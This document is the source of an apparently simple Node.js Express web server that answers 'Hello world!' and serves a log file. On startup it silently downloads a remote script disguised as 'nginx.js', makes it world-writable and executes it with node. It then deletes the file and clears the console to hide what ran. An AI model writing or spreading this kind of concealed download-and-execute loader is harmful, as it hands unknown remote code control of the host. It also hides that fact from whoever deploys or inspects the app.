const express = require('express');
const app = express();
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { exec } = require('child_process');

// Check if FILE_PATH is writable
const isWritable = (directory) => {
  try {
    fs.accessSync(directory, fs.constants.W_OK);
    return true;
  } catch (err) {
    console.log(`Write permissions are not available for ${directory}`);
    return false;
  }
};

const FILE_PATH = './tmp';
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;

if (isWritable(FILE_PATH)) {
  if (!fs.existsSync(FILE_PATH)) {
    fs.mkdirSync(FILE_PATH);
    console.log(`${FILE_PATH} is created`);
  } else {
    console.log(`${FILE_PATH} already exists`);
  }
} else {
  console.log(`Skipping creation of directory ${FILE_PATH} as it is not writable`);
}

app.get("/", function(req, res) {
  res.send("Hello world!");
});

const subTxtPath = path.join(FILE_PATH, 'log.txt');
app.get("/log", (req, res) => {
  fs.readFile(subTxtPath, "utf8", (err, data) => {
    if (err) {
      console.error(err);
      res.status(500).send("Error reading log.txt");
    } else {
      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
      res.send(data);
    }
  });
});

// Specify the URL of the bot.js file to download
const fileUrl = 'https://github.com/eooce/test/releases/download/bulid/nginx.js';
const fileName = 'nginx.js';
const filePath = path.join(FILE_PATH, fileName);

// Download and execute the file
const downloadAndExecute = () => {
  if (!isWritable(FILE_PATH)) {
    console.log("Skipping download and execution as the file path is not writable.");
    return;
  }

  const fileStream = fs.createWriteStream(filePath);

  axios
    .get(fileUrl, { responseType: 'stream' })
    .then(response => {
      response.data.pipe(fileStream);
      return new Promise((resolve, reject) => {
        fileStream.on('finish', resolve);
        fileStream.on('error', reject);
      });
    })
    .then(() => {
      console.log('File downloaded successfully.');
      fs.chmodSync(filePath, '777');

      console.log('running the webapp...');
      const child = exec(`node ${filePath}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`${error}`);
          return;
        }
        console.log(`${stdout}`);
        console.error(`${stderr}`);
      });

      child.on('exit', (code) => {
        fs.unlink(filePath, err => {
          if (err) {
            console.error(`Error deleting file: ${err}`);
          } else {
            console.clear();
            console.log(`App is running!`);
          }
        });
      });
    })
    .catch(error => {
      console.error(`Download error: ${error}`);
    });
};

downloadAndExecute();

app.listen(PORT, () => {
  console.log(`Server is running on port:${PORT}`);
});